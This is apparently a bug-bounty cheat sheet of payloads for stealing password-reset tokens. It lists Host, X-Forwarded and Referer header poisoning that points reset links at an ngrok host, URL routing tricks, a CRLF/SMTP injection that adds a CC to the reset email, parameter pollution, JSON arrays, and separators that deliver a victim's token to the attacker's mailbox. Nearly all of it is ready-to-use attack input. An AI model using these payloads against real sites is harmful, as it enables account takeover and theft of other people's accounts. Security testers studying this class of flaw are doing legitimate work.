**Token leak via Referer header:**
1. Click on forgot password and capture it in burp
2. set the referer header to your ngrok
3. check the email and see if it is from ngrok

**Token leak via Host header:**
1. Change `Host:` header value to ngrok.io link

**Override Host Header:**
1. Change `/resetPassword` to `https://company.com/resetPassword`
2. Change `Host:` value to ngrok.io link

**Ambiguate The Host header:**
- Change `Host:` value to company.com@ngrok.io
or
- Change `Host:` value to comany.com:@ngrok.io
or
- Change `Host:` value to comany.com: ngrok.io

**Change routing of the request**
- Change URL to `POST @ngrok.io/resetPassword`
or 
- Change URL to `POST :@ngrok.io/reserPassword`
or
- Change URL to `POST @ngrok.io/resetPassword#`
or
- Change URL to `POST /resetPassword@ngrok.io#`

**Add another Host header**
1. Add one more `Host:` header into request with value ngrok.io
or
- Add the same but with a space ` Host:` and value is ngrok.io

**X Forward For**
- Change `Host:` value to ngrok.io
- Add `X-Forward-Host: ngrok.io` header.

or 
- Change `Host: ngrok.io` value to ngrok.io
- Add `X-Forward-Host: company.com` header.

**X-Forward-For + Referer header:**

- Add `X-Forward-For: ngrok.io`
- Add `Referer: https://ngrok.io`

**Use Non-Standard Headers**
Just flood the request by these headers.
```
X-Forward-For: ngrok.io
X-Forward-Host: ngrok.io
X-Client-IP: ngrok.io
X-Originating-IP: ngrok.io
X-WAP-Profile: https://ngrok.io/file.xml
True-Client-IP: ngrok.io
Referer: https://ngrok.io
```
or 
Use encoded IP eg: 0177.1
```
X-Forward-For: 0177.1
X-Forward-Host: 0177.1
X-Client-IP: 0177.1
X-Originating-IP: 0177.1
X-WAP-Profile: https://0177.1/file.xml
True-Client-IP: 0177.1
Referer: https://0177.1
```
or 
```
X-Forward-For: www.company.com@ngrok.io
X-Forward-Host: www.company.com@ngrok.io
X-Client-IP: www.company.com@ngrok.io
X-Originating-IP: www.company.com@ngrok.io
X-WAP-Profile: https://www.company.com@ngrok.io/file.xml
True-Client-IP: www.company.com@ngrok.io
Referer: https://www.company.com@ngrok.io
```
or 
```
X-Forward-For: ngrok.io/.company.com
X-Forward-Host: ngrok.io/.company.com
X-Client-IP: ngrok.io/.company.com
X-Originating-IP: ngrok.io/.company.com
X-WAP-Profile: https://ngrok.io//.company.com/file.xml
True-Client-IP: ngrok.io/.company.com
Referer: https://ngrok.io/.company.com
```

**Use Param Miner or x8**
https://mokhansec.medium.com/full-account-takeover-worth-1000-think-out-of-the-box-808f0bdd8ac7

**Burp collaborator/ Interacct.sh**
1. SignUp with me@gmail.com.id.burpcollaborator.net
2. Send resetpassword request
3. Check the collabrator.
[Blog realted to this issue](https://0xayub.gitbook.io/blog/)

**CRLF and SMPT Injection**
1. Change email parameter value to `victim@gmail.com%0a%0dcc:ngrok.io@gmail.com`

**Try using parameter pollution technique**
1. i.e : `victim@gmail.com&email=me@gmail.com` to recieve token on your mail.

**Content Type Header To application/json**
- Change `Content-Type:` header to application/json.
- Send a array `{"email":["victim@gmail.com","me@gmail.com"]}`

**Use of seperators**
- Use `|`, `%20` or `,` to recieve token on mail.
- Change `email=` parameter to `victim@gmail.com,me@gmail.com`
- Change `email=` parameter to `victim@gmail.com,me%20gmail.com` 
- Change `email=` parameter to `victim@gmail.com,me|gmail.com`

**Expose token in Response:**
- Change `email=` to `me` inteal of `me@gmail.com`

